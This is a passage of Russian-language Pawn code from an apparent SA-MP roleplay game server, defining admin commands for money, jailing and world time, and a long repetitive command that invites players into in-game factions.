	if(sscanf(params, "ii", params[0], params[1])) return SCM(playerid, -1, " Введите: /dropmoney [0 - с кошелька | 1 - с банка] [сумма]");
	if(params[0] == 0)// pCash
	{
	    if((PlayerInfo[playerid][pCash]-params[1]) < 0) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег!");
		PlayerInfo[playerid][pCash]-= params[1];
		SCM(playerid, COLOR_BLUE, " Деньги уничтожены");
	}
	else if(params[0] == 1) // pBank
	{
		if((PlayerInfo[playerid][pBank]-params[1]) < 0) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег!");
		PlayerInfo[playerid][pBank]-= params[1];
		SCM(playerid, COLOR_BLUE, " Деньги уничтожены");
	}
	else return SCM(playerid, -1, " Введите: /dropmoney [0 - с кошелька | 1 - с банка] [сумма]");
	return true;
}
CMD:jail(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return SCM(playerid, -1, " Введите: /jail [id игрока] [время(минуты)]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн");
	if(params[1] > 120) return SCM(playerid, COLOR_GREY, " Игроков можно посадить максимум на 2 часа (120 минут)");
	if(params[1] < 0) return true;
	format(YCMDstr, sizeof(YCMDstr), " Вы посадили %s в тюрьму на %i минут",Name(params[0]),params[1]);
	SCM(playerid, COLOR_LIGHTRED, YCMDstr);
	DelGun(params[0]);
	SetPlayerInterior(params[0], 6);
	SetPlayerPos(params[0],264.1425,77.4712,1001.0391);
	SetPlayerFacingAngle(params[0], 263.0160);
	PlayerInfo[params[0]][pMestoJail] = 1;
	PlayerInfo[params[0]][pJailTime] = params[1]*60;
	format(YCMDstr, sizeof(YCMDstr), " Вы посажены администратором %s на %i минут",NameServer, params[1]);
	SCM(params[0], COLOR_LIGHTRED, YCMDstr);
	printf("Администратор %s посадил в тюрьму %s на %i секунд", Name(playerid), Name(params[0]), params[1]);
	return true;
}
CMD:prison(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /prison [ID] [Время]");
	if(sscanf(params, "ud",params[0],params[1])) params[1] = 600;
	if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID) return SCM(playerid, COLOR_GREY, " Игрок не найден!");
	PlayerInfo[params[0]][pMestoJail] = 2;
	SetPlayerVirtualWorld(params[0], 1);
	PlayerInfo[params[0]][pJailTime] = params[1];
	ResetPlayerWeapons(params[0]);
	SetPlayerVirtualWorld(params[0], 1);
	SpawnPlayer(params[0]);
	format(YCMDstr, sizeof(YCMDstr), " Администратор %s посадил в Деморган %s на %i сек", Name(playerid), Name(params[0]), params[1]);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	GameTextForPlayer(params[0], "~w~YOU ARE IN ~r~PRISON", 5000, 4);
	SendMes(params[0],COLOR_LIGHTRED," Вы помещены в форт ДеМорган администратором %s", NameServer);
	printf("Администратор %s посадил в форт Деморган %s на %i секунд", Name(playerid), Name(params[0]), params[1]);
	return 1;
}
CMD:offprison(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4) return true;
	new name[32], time = 0;
	if(sscanf(params, "s[32]", name, time)) return SCM(playerid, -1, " Введите: /offprison [ник] [время]");
	sscanf(params, "s[32]d", name, time);
	if(time == 0) time = 600;
	new id = GetPlayerID(name);
	if(IsPlayerConnected(id)) {
		format(string, sizeof(string), "/prison %i %i", id, time);
		CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
	} else {
	    mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pMestoJail = '4',pJailTime = '%d', pText = '7' WHERE name = '%s'",time, name);
		mysql_function_query(DATABASE,QUERY,false,"","");
		format(YCMDstr, sizeof(YCMDstr), " Администратор %s посадил в offДеморган %s, на %d сек",Name(playerid),name, time);
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		printf("Администратор %s посадил %s в Деморган в оффлайн-режиме на %i сек", PlayerInfo[playerid][pName], name, time);
	}
	
	return true;
}
CMD:settime(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return	SCM(playerid, -1, " Введите: /settime [время]");
	SetWorldTime(params[0]);
	format(YCMDstr, sizeof(YCMDstr), " Время установлено на %i часов.",params[0]);
	ABroadCast(-1, YCMDstr, 4);
	printf("Администратор %s установил время сервера на %i", Name(playerid), params[0]);
	return true;
}
stock CanInvite(playerid)
{
	new rankk = PlayerInfo[playerid][pRank];
	switch(PlayerInfo[playerid][pMember])
	{
	    case 3,19:
	    {
	        switch(rankk) { case 14,15: return true; }
	    }
	    case 4,5,6,9,11,12,13,14,15,16,17,18,20,24,26,29:
	    {
	        switch(rankk) { case 9, 10: return true; }
	    }
	    case 7:
	    {
	    	switch(rankk) { case 5,  6: return true; }
	    }
	}
	return false;
}
CMD:invite(playerid, params[])
{
    if(PlayerInfo[playerid][pLogin] == 0 || !GetPVarInt(playerid,"Fraction_Duty")) return true;
	new para1;
	new sendername[MAX_PLAYER_NAME];
	new giveplayer[MAX_PLAYER_NAME];
	new ftext[32];
	if(IsPlayerConnected(playerid))
	{
		if(sscanf(params, "u",para1)) return SCM(playerid, -1, " Введите: /invite [id]");
		if(GetDistanceBetweenPlayers(playerid, para1) < 5.0)
		{
			if (PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 3 && PlayerInfo[playerid][pRank] == 14)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 3 && PlayerInfo[playerid][pRank] == 14) {  ftext = "Army SF"; InviteSkin[para1] = 287;  }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 287);
						PlayerInfo[para1][pMember] = 3;
						PlayerInfo[para1][pRank] = 1;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pJob] = 0;
						PlayerInfo[para1][pModel] = 287;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 4 || PlayerInfo[playerid][pMember] == 4 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return  SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 4 || PlayerInfo[playerid][pMember] == 4 && PlayerInfo[playerid][pRank] == 9) { ftext = "Medic SF"; InviteSkin[para1] = 70; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						PlayerInfo[para1][pMember] = 4;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pJobHeal] = PlayerInfo[playerid][pJobHeal];
						PlayerInfo[para1][pModel] = 275;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 5 || PlayerInfo[playerid][pMember] == 5 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 5 || PlayerInfo[playerid][pMember] == 5 && PlayerInfo[playerid][pRank] == 9) { ftext = "La Cosa Nostra"; InviteSkin[para1] = 223; }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 223);
						PlayerInfo[para1][pMember] = 5;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 124;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 6 || PlayerInfo[playerid][pMember] == 6 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 6 || PlayerInfo[playerid][pMember] == 6 && PlayerInfo[playerid][pRank] == 9) { ftext = "Yakuza"; InviteSkin[para1] = 120;  }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 123);
						PlayerInfo[para1][pMember] = 6;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 123;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 7 || PlayerInfo[playerid][pMember] == 7 && PlayerInfo[playerid][pRank] == 5)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 7 || PlayerInfo[playerid][pMember] == 7 && PlayerInfo[playerid][pRank] == 5) {   ftext = "Mayor"; InviteSkin[para1] = 57; }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						PlayerInfo[para1][pMember] = 7;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						PlayerInfo[para1][pModel] = 57;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 8 && PlayerInfo[playerid][pRank] == 2)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 8 || PlayerInfo[playerid][pMember] == 8 && PlayerInfo[playerid][pRank] == 2) { ftext = "Casino Caligula"; InviteSkin[para1] = 171;  }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 287);
						PlayerInfo[para1][pMember] = 8;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						PlayerInfo[para1][pModel] = 287;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 9 || PlayerInfo[playerid][pMember] == 9 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 9 || PlayerInfo[playerid][pMember] == 9 && PlayerInfo[playerid][pRank] == 9) { ftext = "SF News"; InviteSkin[para1] = 250; }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						PlayerInfo[para1][pMember] = 9;
						PlayerInfo[para1][pRank] = 1;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pJob] = 0;
						PlayerInfo[para1][pModel] = 188;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 11 || PlayerInfo[playerid][pMember] == 11 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 11 || PlayerInfo[playerid][pMember] == 11 && PlayerInfo[playerid][pRank] == 9) { ftext = "Instructors"; InviteSkin[para1] = 59;  }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 59);
						PlayerInfo[para1][pMember] = 11;
						PlayerInfo[para1][pRank] = 1;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pJob] = 0;
						PlayerInfo[para1][pModel] = 59;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 12 || PlayerInfo[playerid][pMember] == 12 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 12 ||PlayerInfo[playerid][pMember] == 12 && PlayerInfo[playerid][pRank] == 9) {  ftext = "Ballas"; InviteSkin[para1] = 102;  }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 103);
						PlayerInfo[para1][pMember] = 12;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 103;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 13 || PlayerInfo[playerid][pMember] == 13 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 13 || PlayerInfo[playerid][pMember] == 13 && PlayerInfo[playerid][pRank] == 9) {  ftext = "Vagos"; InviteSkin[para1] = 108; }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 108);
						PlayerInfo[para1][pMember] = 13;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 108;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 14 || PlayerInfo[playerid][pMember] == 14 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 14 || PlayerInfo[playerid][pMember] == 14 && PlayerInfo[playerid][pRank] == 9) {  ftext = "Russian Mafia"; InviteSkin[para1] = 111; }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 112);
						PlayerInfo[para1][pMember] = 14;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 111;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 15 || PlayerInfo[playerid][pMember] == 15 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 15 || PlayerInfo[playerid][pMember] == 15 && PlayerInfo[playerid][pRank] == 9) {  ftext = "Grove Street"; InviteSkin[para1] = 106;  }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 105);
						PlayerInfo[para1][pMember] = 15;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 105;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 16 || PlayerInfo[playerid][pMember] == 16 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 16 || PlayerInfo[playerid][pMember] == 16 && PlayerInfo[playerid][pRank] == 9) { ftext = "LS News"; InviteSkin[para1] = 261; }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						PlayerInfo[para1][pMember] = 16;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						PlayerInfo[para1][pModel] = 188;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 17 || PlayerInfo[playerid][pMember] == 17 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 17 || PlayerInfo[playerid][pMember] == 17 && PlayerInfo[playerid][pRank] == 9) {  ftext = "Los Aztecas"; InviteSkin[para1] = 115; }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 114);
						PlayerInfo[para1][pMember] = 17;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 114;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 18 || PlayerInfo[playerid][pMember] == 18 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 18 || PlayerInfo[playerid][pMember] == 18 && PlayerInfo[playerid][pRank] == 9) {  ftext = "Rifa";InviteSkin[para1] = 174; }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 175);
						PlayerInfo[para1][pMember] = 18;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 175;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 19 || PlayerInfo[playerid][pMember] == 19 && PlayerInfo[playerid][pRank] == 14)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 19 || PlayerInfo[playerid][pMember] == 19 && PlayerInfo[playerid][pRank] == 14) { ftext = "Army LV"; InviteSkin[para1] = 287;  }
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 287);
						PlayerInfo[para1][pMember] = 19;
						PlayerInfo[para1][pRank] = 1;
						PlayerInfo[para1][pJob] = 0;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pModel] = 287;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 20 || PlayerInfo[playerid][pMember] == 20 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
						if(PlayerInfo[playerid][pLeader] == 20 || PlayerInfo[playerid][pMember] == 20 && PlayerInfo[playerid][pRank] == 9) { ftext = "LV News";InviteSkin[para1] = 261;}
						else { return true; }
						GetPlayerName(para1, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, "Вы пригласили %s присоеденится к %s", giveplayer,ftext);
						SCM(playerid, 0x6BB3FFAA, string);
						format(string, 128, "Вы приглашены в %s лидером %s", ftext, sendername);
						SCM(para1, 0x6BB3FFAA, string);
						SetPlayerSkin(para1, 188);
						PlayerInfo[para1][pMember] = 20;
						PlayerInfo[para1][pRank] = 1;
						DeletePVar(para1,"Fraction_Duty");
						PlayerInfo[para1][pJob] = 0;
						PlayerInfo[para1][pModel] = 188;
						SetPlayerToTeamColor(para1);
					}
				}
			}
			else if (PlayerInfo[playerid][pLeader] == 33 || PlayerInfo[playerid][pMember] == 33 && PlayerInfo[playerid][pRank] == 9)
			{
				if(IsPlayerConnected(para1))
				{
					if(para1 != INVALID_PLAYER_ID)
					{
						if(IsPlayerInAnyVehicle(para1)) return SCM(playerid, COLOR_GREY, "Игрок в машине!");
						if(PlayerInfo[para1][pMember] != 0) return SCM(playerid, COLOR_GREY, "Игрок состоит в организации");
						if(PlayerInfo[para1][pWarns] >= 1) return SCM(playerid, COLOR_GRAD1, "У игрока Warn.");
